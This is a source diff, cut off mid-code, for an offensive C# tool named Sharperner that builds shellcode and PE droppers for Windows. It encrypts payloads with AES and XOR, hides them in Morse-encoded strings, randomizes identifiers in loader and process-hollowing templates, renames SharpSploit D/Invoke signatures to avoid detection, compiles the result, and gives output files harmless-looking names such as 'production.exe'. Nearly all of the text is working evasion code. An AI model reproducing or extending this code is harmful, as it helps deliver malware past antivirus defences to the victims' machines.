@@ -8,9 +8,258 @@ using System.Text;
 using System.Threading;
 using System.Text.RegularExpressions;
 using System.Diagnostics;
+using System.IO.Compression;
+using System.Runtime.InteropServices;
 
 namespace Sharperner
 {
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_DOS_HEADER
+    {
+        public ushort e_magic;    // Magic number
+        public ushort e_cblp;     // Bytes on last page of file
+        public ushort e_cp;       // Pages in file
+        public ushort e_crlc;     // Relocations
+        public ushort e_cparhdr;  // Size of header in paragraphs
+        public ushort e_minalloc; // Minimum extra paragraphs needed
+        public ushort e_maxalloc; // Maximum extra paragraphs needed
+        public ushort e_ss;       // Initial (relative) SS value
+        public ushort e_sp;       // Initial SP value
+        public ushort e_csum;     // Checksum
+        public ushort e_ip;       // Initial IP value
+        public ushort e_cs;       // Initial (relative) CS value
+        public ushort e_lfarlc;   // File address of relocation table
+        public ushort e_ovno;     // Overlay number
+        public uint e_res1;       // Reserved
+        public uint e_res2;       // Reserved
+        public ushort e_oemid;    // OEM identifier (for e_oeminfo)
+        public ushort e_oeminfo;  // OEM information; e_oemid specific
+        public uint e_res3;       // Reserved
+        public uint e_res4;       // Reserved
+        public uint e_res5;       // Reserved
+        public uint e_res6;       // Reserved
+        public uint e_res7;       // Reserved
+        public int e_lfanew;      // File address of new exe header
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_FILE_HEADER
+    {
+        public ushort Machine;
+        public ushort NumberOfSections;
+        public uint TimeDateStamp;
+        public uint PointerToSymbolTable;
+        public uint NumberOfSymbols;
+        public ushort SizeOfOptionalHeader;
+        public ushort Characteristics;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_NT_HEADERS_COMMON
+    {
+        public uint Signature;
+        public IMAGE_FILE_HEADER FileHeader;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_NT_HEADERS32
+    {
+        public uint Signature;
+        public IMAGE_FILE_HEADER FileHeader;
+        public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_NT_HEADERS64
+    {
+        public uint Signature;
+        public IMAGE_FILE_HEADER FileHeader;
+        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_OPTIONAL_HEADER32
+    {
+        public ushort Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public uint BaseOfData;
+        public uint ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public ushort Subsystem;
+        public ushort DllCharacteristics;
+        public uint SizeOfStackReserve;
+        public uint SizeOfStackCommit;
+        public uint SizeOfHeapReserve;
+        public uint SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct IMAGE_OPTIONAL_HEADER64
+    {
+        public ushort Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public ulong ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public ushort Subsystem;
+        public ushort DllCharacteristics;
+        public ulong SizeOfStackReserve;
+        public ulong SizeOfStackCommit;
+        public ulong SizeOfHeapReserve;
+        public ulong SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
+    }
+
+    static class ExeChecker
+    {
+        public static bool IsValidExe(string fileName)
+        {
+            if (!File.Exists(fileName))
+                return false;
+
+            try
+            {
+                using (var stream = File.OpenRead(fileName))
+                {
+                    IMAGE_DOS_HEADER dosHeader = GetDosHeader(stream);
+                    if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE)
+                        return false;
+
+                    IMAGE_NT_HEADERS_COMMON ntHeader = GetCommonNtHeader(stream, dosHeader);
+                    if (ntHeader.Signature != IMAGE_NT_SIGNATURE)
+                        return false;
+
+                    if ((ntHeader.FileHeader.Characteristics & IMAGE_FILE_DLL) != 0)
+                        return false;
+
+                    switch (ntHeader.FileHeader.Machine)
+                    {
+                        case IMAGE_FILE_MACHINE_I386:
+                            return IsValidExe32(GetNtHeader32(stream, dosHeader));
+
+                        case IMAGE_FILE_MACHINE_IA64:
+                        case IMAGE_FILE_MACHINE_AMD64:
+                            return IsValidExe64(GetNtHeader64(stream, dosHeader));
+                    }
+                }
+            }
+            catch (InvalidOperationException)
+            {
+                return false;
+            }
+
+            return true;
+        }
+
+        static bool IsValidExe32(IMAGE_NT_HEADERS32 ntHeader)
+        {
+            return ntHeader.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC;
+        }
+
+        static bool IsValidExe64(IMAGE_NT_HEADERS64 ntHeader)
+        {
+            return ntHeader.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
+        }
+
+        static IMAGE_DOS_HEADER GetDosHeader(Stream stream)
+        {
+            stream.Seek(0, SeekOrigin.Begin);
+            return ReadStructFromStream<IMAGE_DOS_HEADER>(stream);
+        }
+
+        static IMAGE_NT_HEADERS_COMMON GetCommonNtHeader(Stream stream, IMAGE_DOS_HEADER dosHeader)
+        {
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+            return ReadStructFromStream<IMAGE_NT_HEADERS_COMMON>(stream);
+        }
+
+        static IMAGE_NT_HEADERS32 GetNtHeader32(Stream stream, IMAGE_DOS_HEADER dosHeader)
+        {
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+            return ReadStructFromStream<IMAGE_NT_HEADERS32>(stream);
+        }
+
+        static IMAGE_NT_HEADERS64 GetNtHeader64(Stream stream, IMAGE_DOS_HEADER dosHeader)
+        {
+            stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
+            return ReadStructFromStream<IMAGE_NT_HEADERS64>(stream);
+        }
+
+        static T ReadStructFromStream<T>(Stream stream)
+        {
+            int structSize = Marshal.SizeOf(typeof(T));
+            IntPtr memory = IntPtr.Zero;
+
+            try
+            {
+                memory = Marshal.AllocCoTaskMem(structSize);
+                if (memory == IntPtr.Zero)
+                    throw new InvalidOperationException();
+
+                byte[] buffer = new byte[structSize];
+                int bytesRead = stream.Read(buffer, 0, structSize);
+                if (bytesRead != structSize)
+                    throw new InvalidOperationException();
+
+                Marshal.Copy(buffer, 0, memory, structSize);
+
+                return (T)Marshal.PtrToStructure(memory, typeof(T));
+            }
+            finally
+            {
+                if (memory != IntPtr.Zero)
+                    Marshal.FreeCoTaskMem(memory);
+            }
+        }
+
+        const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;  // MZ
+        const uint IMAGE_NT_SIGNATURE = 0x00004550; // PE00
+
+        const ushort IMAGE_FILE_MACHINE_I386 = 0x014C;  // Intel 386
+        const ushort IMAGE_FILE_MACHINE_IA64 = 0x0200;  // Intel 64
+        const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664; // AMD64
+
+        const ushort IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10B; // PE32
+        const ushort IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B; // PE32+
+
+        const ushort IMAGE_FILE_DLL = 0x2000;
+    }
     public static class VisualStudioProvider
     {
         public static DirectoryInfo TryGetSolutionDirectoryInfo(string currentPath = null)
@@ -78,8 +327,76 @@ namespace Sharperner
         }
     }
 
+    public static class Compile
+    {
+        public static void CompileWithMSBuild(string msBuildPath, string slnFile, string projectName)
+        {
+            var strCmd = $"/c \"{msBuildPath}\\MSBuild\\Current\\Bin\\MSBuild.exe\" {slnFile} /t:{projectName} /p:Configuration=Release /p:Platform=x64";
+
+            using (Process compiler = new Process())
+            {
+                compiler.StartInfo.FileName = @"CMD.exe";
+                compiler.StartInfo.Arguments = strCmd;
+                compiler.StartInfo.UseShellExecute = false;
+                compiler.StartInfo.CreateNoWindow = true;
+                compiler.StartInfo.RedirectStandardError = true;
+                compiler.Start();
+            }
+        }
+
+        public static void CompileAssembly(string outputFile, string tempFile)
+        {
+            //compile the code
+            //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
+            string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
+            try
+            {
+                Process process = new Process();
+
+                // Stop the process from opening a new window
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.CreateNoWindow = true;
+
+                // Setup executable and parameters
+                process.StartInfo.FileName = @"CMD.exe";
+                process.StartInfo.Arguments = strCmd;
+
+                // Go
+                process.Start();
+
+                Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+            }
+            catch (Exception err)
+            {
+                Console.WriteLine($"[!] Error compiling template file with the following error {err.Message}");
+            }
+        }
+    }
+
     class Program
     {
+        public static byte[] Decompress(byte[] data)
+        {
+            MemoryStream input = new MemoryStream(data);
+            MemoryStream output = new MemoryStream();
+            using(DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
+            {
+                dstream.CopyTo(output);
+            }
+            return output.ToArray();
+        }
+
+        public static byte[] Compress(byte[] data)
+        {
+            MemoryStream output = new MemoryStream();
+            using(DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
+            {
+                dstream.Write(data, 0, data.Length);
+            }
+            return output.ToArray();
+        }
+
         private static bool IsBase64String(string base64)
         {
             base64 = base64.Trim();
@@ -239,6 +556,25 @@ namespace Sharperner
             return key;
         }
 
+        public static string GetMSBuildPath()
+        {
+            var processInfo = new ProcessStartInfo("cmd.exe", "/c \"C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true,
+                WorkingDirectory = @"C:\Windows\System32\"
+            };
+
+            StringBuilder sb = new StringBuilder();
+            Process p = Process.Start(processInfo);
+            p.OutputDataReceived += (sender, a) => sb.AppendLine(a.Data);
+            p.BeginOutputReadLine();
+            p.WaitForExit();
+            return(sb.ToString().Trim());
+        }
+
         public static void banner()
         {
             string banner = @"
@@ -259,6 +595,7 @@ by @ch4rm with <3
 /file       B64,hex,raw
 /type       cs,cpp
 /out        Output file Location (Optional)
+/convert    File input. Convert PE to .NET Assembly using D/Invoke (Optional)
 
 Example:
 Sharperner.exe /file:file.txt /type:cpp
@@ -297,390 +634,570 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     arguments[argument] = string.Empty;
             }
 
-            if (arguments.Count == 0 || !arguments.ContainsKey("/file") || !arguments.ContainsKey("/type"))
+            if (arguments.Count == 0)
             {
-                Console.WriteLine("[!] Please enter /file and /type as arguments");
+                Console.WriteLine("[!] No arguments supplied");
                 help();
             }
-            else if (string.IsNullOrEmpty(arguments["/file"]) || string.IsNullOrEmpty(arguments["/type"]))
+            else if (arguments.ContainsKey("/convert"))
             {
-                Console.WriteLine("[!] Empty input file or type");
-            }
-            else if (arguments["/type"].ToLower() != "cs" && arguments["/type"].ToLower() != "cpp")
-            {
-                Console.WriteLine("[!] Invalid file type. Only cs or cpp are accepted");
-            }
-            else
-            {
-                filePath = arguments["/file"];
-                dropperFormat = arguments["/type"].ToLower();
-
-                if (!File.Exists(filePath)) //if file exists
+                if (string.IsNullOrEmpty(arguments["/convert"]))
                 {
-                    Console.WriteLine("[+] Missing input file");
-                    Environment.Exit(0);
+                    Console.WriteLine("[!] Empty input file or type");
                 }
                 else
                 {
-                    try
+                    filePath = arguments["/convert"];
+
+                    if (!File.Exists(filePath)) //if file exists
                     {
-                        if(IsHex(File.ReadAllText(filePath)))
+                        Console.WriteLine("[+] File Not Found");
+                        return;
+                    }
+                    else
+                    {
+                        if (ExeChecker.IsValidExe(filePath))
                         {
-                            Console.WriteLine("[+] Hex payload detected.");
-                            rawSh3lLc0d3 = StringToByteArray(File.ReadAllText(filePath));
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
-                        }
-                        else if (isBinary(filePath))
-                        {
-                            Console.WriteLine("[+] Raw payload detected.");
-                            rawSh3lLc0d3 = File.ReadAllBytes(filePath);
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
-                        }
-                        else if (IsBase64String(File.ReadAllText(filePath)))
-                        {
-                            Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
-                            base64String = File.ReadAllText(filePath);
-                            rawSh3lLc0d3 = Convert.FromBase64String(base64String);
-                            aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
+                            if (!filePath.EndsWith(".exe"))
+                            {
+                                Console.WriteLine("[!] Invalid extension");
+                                return;
+                            }
+                            else
+                            {
+                                var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
+                                var parentDir = directory.FullName;
+
+                                outputFile = $"DInvoke_{Path.GetFileName(filePath)}";
+
+                                var nativeBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\Program.cs");
+                                var loaderFileContent = File.ReadAllText(nativeBinaryLoaderPath);
+                                var tempLoaderFileContent = loaderFileContent;
+                                var nativeExecutableBinaryLoaderPath = Path.Combine(parentDir, @"DInvoke\bin\x64\Release\DInvoke.exe");
+
+                                Console.WriteLine("[+] Embedding into .NET using D/Invoke Method. Credits to @SharpSploit.");
+
+                                var PEFile = File.ReadAllBytes(filePath);
+                                var msBuildPath = GetMSBuildPath();
+                                var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
+
+                                MorseForFun.InitializeDictionary();
+
+                                var compByteArray = Compress(PEFile);
+                                var b64String = Convert.ToBase64String(compByteArray);
+                                var morsedb64String = MorseForFun.Send(b64String);
+
+                                try
+                                {
+                                    //replace all occurences
+                                    string[] signatures = { "morsedb64string", "b64string", "bufferByteArray", "deCompByteArray", "MapMap", "Menyeluruh", "PanggilMapPEMod", "GetPeMetaData", "GetNativeExportAddress",
+                                                    "GetExportAddress", "GetLoadedModuleAddress", "GetLibraryAddress", "LoadModuleFromDisk", "DynamicAPIInvoke", "AllocateBytesToMemory", "RelocateModule",
+                                                    "RewriteModuleIAT", "SetModuleSectionPermissions", "MapThisToMemory", "MapModuleToMemory", "DLLName", "FunctionName", "PeHeader", "OptHeaderSize", "OptHeader",
+                                                    "Magic", "pExport", "ExportRVA", "OrdinalBase", "NumberOfFunctions", "NumberOfNames", "FunctionsRVA", "NamesRVA", "OrdinalsRVA"};
+
+                                    foreach (string signature in signatures)
+                                    {
+                                        string randomWord = GenerateRandomString();
+
+                                        // randomizing in SharpSploit's lib
+                                        foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                        {
+                                            string libFileContent = File.ReadAllText(file);
+
+                                            loaderFileContent = loaderFileContent.Replace(signature, randomWord);
+                                            
+                                            libFileContent = libFileContent.Replace(signature, randomWord);
+                                            
+                                            File.WriteAllText(file, libFileContent);
+
+                                        }
+                                    }
+
+                                    loaderFileContent = loaderFileContent.Replace("REPLACE MORSECODE HERE", morsedb64String);
+
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Error replacing values");
+                                }
+
+                                try
+                                {
+                                    File.WriteAllText(nativeBinaryLoaderPath, loaderFileContent);
+
+                                    Compile.CompileWithMSBuild(msBuildPath, slnFile, "DInvoke");
+
+                                    Thread.Sleep(2000);
+
+                                    File.Copy(nativeExecutableBinaryLoaderPath, $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
+
+                                    Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
+                                }
+                                catch
+                                {
+                                    Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
+                                }
+
+                                Console.WriteLine("[+] Doing some cleaning...");
+
+                                //revert all library files
+                                foreach (var file in Directory.EnumerateFiles($"{parentDir}\\DInvoke\\Execution", "*.*", SearchOption.AllDirectories).Where(i => i.EndsWith(".cs")))
+                                {
+                                    File.Copy($"{file}.ori", file, true);
+                                }
+
+                                //revert nativeBinaryLoader
+                                File.WriteAllText(nativeBinaryLoaderPath, tempLoaderFileContent);
+
+                                File.Delete(nativeExecutableBinaryLoaderPath);
+
+                                Thread.Sleep(1000);
+                            }
                         }
                         else
                         {
-                            Console.WriteLine("[!] Couldn't detect file input content.");
-                            Environment.Exit(0);
+                            Console.WriteLine("[+] Invalid PE file");
                         }
-
-
-                        Console.WriteLine($"[+] XOR encode shellcode with key: {xorKey}");
-
-                        // XOR
-                        byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);
-
-                        // back in the history
-                        MorseForFun.InitializeDictionary();
-
-//changes on the quotation
-                        rawB64Output = Convert.ToBase64String(xorAesEncByte);
-                        xorAesEncStringB64 = $"\"{MorseForFun.Send(rawB64Output)}\"";
-                        morsed_aeskey = $"\"{MorseForFun.Send(aes_key)}\"";
-                        morsed_aesiv = $"\"{MorseForFun.Send(aes_iv)}\"";
-                        xorKey = $"\"{MorseForFun.Send(xorKey)}\"";
-
-                        Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
-                    }
-                    catch
-                    {
-                        Console.WriteLine("[!] Error encrypting");
                     }
 
                 }
 
-                if(arguments.ContainsKey("/out"))
+            }
+            else if (arguments.ContainsKey("/file"))
+            {
+                if (!arguments.ContainsKey("/type"))
                 {
-                    outputFile = arguments["/out"];
-                    if(!Path.GetExtension(outputFile).Contains(".exe"))
-                    {
-                        outputFile = $"{outputFile}.exe";
-                    }
+                    Console.WriteLine("[!] Missing /type argument");
+                }
+                else if (string.IsNullOrEmpty(arguments["/file"]) || string.IsNullOrEmpty(arguments["/type"]))
+                {
+                    Console.WriteLine("[!] Empty input file or type");
+                }
+                else if (arguments["/type"].ToLower() != "cs" && arguments["/type"].ToLower() != "cpp")
+                {
+                    Console.WriteLine("[!] Invalid file type. Only cs or cpp are accepted");
                 }
                 else
                 {
-                    // choose either one of these
-                    string[] fileName = { "production.exe","release.exe","Release_x64.exe","prod.exe","config.exe","buildGradle.exe","build.exe" };
-                    outputFile = fileName[random.Next(fileName.Length)];
-                }
+                    filePath = arguments["/file"];
+                    dropperFormat = arguments["/type"].ToLower();
 
-                // Write the file
-                var fullPath = "payload.dec";
-
-                using (StreamWriter writer = new StreamWriter(fullPath))
-                {
-                    Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath} just in case you need it");
-                    writer.WriteLine(rawB64Output);
-                }
-
-                if (dropperFormat == "cs")
-                {
-                    //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c
-
-                    //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");
-
-                    //decrypt it back
-
-                    //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);
-
-                    //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);
-
-                    //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");
-
-                    // Open template file
-                    var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
-
-                    var parentDir = directory.FullName;
-
-                    var templateFile = Path.Combine(parentDir, @"templates\template.cs");
-                    
-                    var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");
-
-                    string templateFileContent = "";
-
-                    // read all content
-                    if (!File.Exists(templateFile)) //if file exists
+                    if (!File.Exists(filePath)) //if file exists
                     {
-                        Console.WriteLine("[!] File does not exists in local, fetching online...");
-                        ServicePointManager.Expect100Continue = true;
-                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                        WebClient client = new WebClient();
-                        try
-                        {
-                            templateFileContent = client.DownloadString("https://raw.githubusercontent.com/aniqfakhrul/Sharperner/main/templates/template.cs");
-                        }
-                        catch
-                        {
-                            Console.WriteLine("[!] No internet connection");
-                            Environment.Exit(0);
-                        }
+                        Console.WriteLine("[+] Missing input file");
+                        Environment.Exit(0);
                     }
                     else
                     {
-                        templateFileContent = File.ReadAllText(templateFile);
-                    }
-
-                    try
-                    {
-                        // randomize method names
-                        var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
-                        var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
-                        Regex rg = new Regex(pattern);
-                        MatchCollection methods = rg.Matches(templateFileContent);
-                        foreach (var method in methods)
+                        try
                         {
-                            if (!method.ToString().Contains("Main"))
+                            if (IsHex(File.ReadAllText(filePath)))
                             {
-                                var methodName = Regex.Match(method.ToString(), methodNamesPattern);
-                                templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                                Console.WriteLine("[+] Hex payload detected.");
+                                rawSh3lLc0d3 = StringToByteArray(File.ReadAllText(filePath));
+                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
+                            }
+                            else if (isBinary(filePath))
+                            {
+                                Console.WriteLine("[+] Raw payload detected.");
+                                rawSh3lLc0d3 = File.ReadAllBytes(filePath);
+                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
+                            }
+                            else if (IsBase64String(File.ReadAllText(filePath)))
+                            {
+                                Console.WriteLine("[+] Base64 input detected. Converting base64 to bytes");
+                                base64String = File.ReadAllText(filePath);
+                                rawSh3lLc0d3 = Convert.FromBase64String(base64String);
+                                aesEncByte = AESEncrypt(rawSh3lLc0d3, aes_key, aes_iv);
+                            }
+                            else
+                            {
+                                Console.WriteLine("[!] Couldn't detect file input content.");
+                                Environment.Exit(0);
                             }
 
-                        }
 
-                        //randomize variable names
-                        string[] variableNames = { "xoredAesB64", "xorKey", "aE5k3y", "aE5Iv", "aesEncrypted", "sh3Llc0d3", "lpNumberOfBytesWritten", "processInfo",
-                                                    "pHandle", "rMemAddress", "tHandle", "ptr", "theKey", "mixed", "input", "theKeystring", "cipherText", "rawKey", "rawIV", "rijAlg", "decryptor", 
-                                                    "msDecrypt", "csDecrypt", "srDecrypt", "plaintext", "cipherData", "decryptedData", "ms", "cs", "alg", "MorseForFun","startInfo","procInfo", "binaryPath",
-                                                    "random", "aes_key", "aes_iv", "stringBuilder"};
+                            Console.WriteLine($"[+] XOR encode shellcode with key: {xorKey}");
 
-                        foreach (string variableName in variableNames)
-                        {
-                            templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
-                        }
+                            // XOR
+                            byte[] xorAesEncByte = xorEncDec(aesEncByte, xorKey);
 
-                        // replace in template file
-                        templateFileContent = templateFileContent.Replace("\"REPLACE SHELLCODE HERE\"", xorAesEncStringB64).Replace("\"REPLACE XORKEY\"", xorKey).Replace("\"REPLACE A3S_KEY\"", morsed_aeskey).Replace("\"REPLACE A3S_IV\"", morsed_aesiv);
+                            // back in the history
+                            MorseForFun.InitializeDictionary();
 
-                    }
-                    catch (Exception err)
-                    {
-                        Console.WriteLine($"[!] {err.Message}");
-                    }
+                            //changes on the quotation
+                            rawB64Output = Convert.ToBase64String(xorAesEncByte);
+                            xorAesEncStringB64 = $"\"{MorseForFun.Send(rawB64Output)}\"";
+                            morsed_aeskey = $"\"{MorseForFun.Send(aes_key)}\"";
+                            morsed_aesiv = $"\"{MorseForFun.Send(aes_iv)}\"";
+                            xorKey = $"\"{MorseForFun.Send(xorKey)}\"";
 
-                    // write all back into the file
-                    try
-                    {
-                        Console.WriteLine("[+] Writing shellcode to template file...");
-                        File.WriteAllText(tempFile, templateFileContent);
-                    }
-                    catch (Exception err)
-                    {
-                        Console.WriteLine($"[!] Error writing shellcode to template file with the following error {err.Message}");
-                    }
 
-                    //compile the code
-                    //https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standarderror?redirectedfrom=MSDN&view=net-5.0#System_Diagnostics_Process_StandardError
-                    string strCmd = $"/c C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:{outputFile} {tempFile}";
-                    try
-                    {
-                        Process process = new Process();
+                            //temp
+                            //xorAesEncStringB64 = string.Join("\"" + Environment.NewLine + "\"", xorAesEncStringB64.Split()
+                            //.Select((word, index) => new { word, index })
+                            //.GroupBy(x => x.index / 30)
+                            //.Select(grp => string.Join(" ", grp.Select(x => x.word))));
+                            //Console.WriteLine(xorAesEncStringB64);
 
-                        // Stop the process from opening a new window
-                        process.StartInfo.RedirectStandardOutput = true;
-                        process.StartInfo.UseShellExecute = false;
-                        process.StartInfo.CreateNoWindow = true;
-
-                        // Setup executable and parameters
-                        process.StartInfo.FileName = @"CMD.exe";
-                        process.StartInfo.Arguments = strCmd;
-
-                        // Go
-                        process.Start();
-
-                        Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
-                    }
-                    catch (Exception err)
-                    {
-                        Console.WriteLine($"[!] Error compiling template file with the following error {err.Message}");
-                    }
-
-                    Console.WriteLine($"[+] Doing some cleaning...");
-                    Thread.Sleep(1000);
-
-                    File.Delete(tempFile);
-                }
-                else if(dropperFormat == "cpp")
-                {
-                    // locate the file
-                    var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
-
-                    if (directory == null)
-                    {
-                        Console.WriteLine("[!] Couldn't locate files. Exiting...");
-                        Environment.Exit(0);
-                    }
-
-                    var parentDir = directory.FullName;
-
-                    var rootFile = Path.Combine(parentDir, @"loader\loader.cpp");
-                    
-                    var templateFile = Path.Combine(parentDir, @"templates\hollow.cpp");
-
-                    var slnFile = Path.Combine(parentDir, @"Sharperner.sln");
-
-                    string templateFileContent = "";
-
-                    // read all content
-                    if (!File.Exists(templateFile)) //if file exists
-                    {
-                        Console.WriteLine("[!] Template file does not exists in local, fetching online...");
-                        ServicePointManager.Expect100Continue = true;
-                        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
-                        WebClient client = new WebClient();
-                        try
-                        {
-                            templateFileContent = client.DownloadString("https://gist.githubusercontent.com/aniqfakhrul/9d25308ee3666e5d2856e9e940df0297/raw/afed7f6e8479f933c2bad55efb138c93a7646881/hollow_sc.cpp");
+                            Console.WriteLine("[+] Payload is now AES and XOR encrypted!");
                         }
                         catch
                         {
-                            Console.WriteLine("[!] No internet connection");
-                            Environment.Exit(0);
+                            Console.WriteLine("[!] Error encrypting");
+                        }
+
+                    }
+
+                    if (arguments.ContainsKey("/out"))
+                    {
+                        outputFile = arguments["/out"];
+                        if (!Path.GetExtension(outputFile).Contains(".exe"))
+                        {
+                            outputFile = $"{outputFile}.exe";
                         }
                     }
                     else
                     {
-                        templateFileContent = File.ReadAllText(templateFile);
+                        // choose either one of these
+                        string[] fileName = { "production.exe", "release.exe", "Release_x64.exe", "prod.exe", "config.exe", "buildGradle.exe", "build.exe" };
+                        outputFile = fileName[random.Next(fileName.Length)];
                     }
 
-                    //create backup copy of the template
-                    string temp = File.ReadAllText(rootFile);
+                    // Write the file
+                    var fullPath = "payload.dec";
 
-                    // replace required values
-                    try
+                    using (StreamWriter writer = new StreamWriter(fullPath))
                     {
-                        //randomize variable names
-                        string[] variableNames = { "morsed", "sh3llc0de", "decoded", "b64a3skey", "b64a3siv", "morsedb64a3skey", "morsedb64a3siv", "morsedxorKey", "xorKey",
-                                                    "x0rek3y", "ciphertext", "recovered", "policy", "explorer_handle", "hollow_bin", "pid", "bytesWritten", "p_size", "overwrite",
-                                                    "translated", "lines", "delim", "ascii_to_morse", "tokenize", "translate_morse", "get_PPID", "howlow_sc"};
+                        Console.WriteLine($"[+] Writing encoded base64 payload to {fullPath} just in case you need it");
+                        writer.WriteLine(rawB64Output);
+                    }
 
-                        foreach (string variableName in variableNames)
+                    if (dropperFormat == "cs")
+                    {
+                        //https://stackoverflow.com/questions/5036590/how-to-retrieve-certificates-from-a-pfx-file-with-c
+
+                        //Console.WriteLine($"XOR encrypted text: {xorAesEncStringB64}");
+
+                        //decrypt it back
+
+                        //byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey);
+
+                        //string sh3Llc0d3 = DecryptStringFromBytes(aesEncrypted, key, iv);
+
+                        //Console.WriteLine($"XOR decrypted text: {sh3Llc0d3}");
+
+                        // Open template file
+                        var directory = VisualStudioProvider.TryGetSolutionDirectoryInfo();
+
+                        var parentDir = directory.FullName;
+
+                        var templateFile = Path.Combine(parentDir, @"templates\template.cs");
+
+                        var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "output.cs");
+
+                        string templateFileContent = "";
+
+                        // read all content
+                        if (!File.Exists(templateFile)) //if file exists
                         {
-                            templateFileContent = templateFileContent.Replace(variableName, GenerateRandomString());
-                        }
-
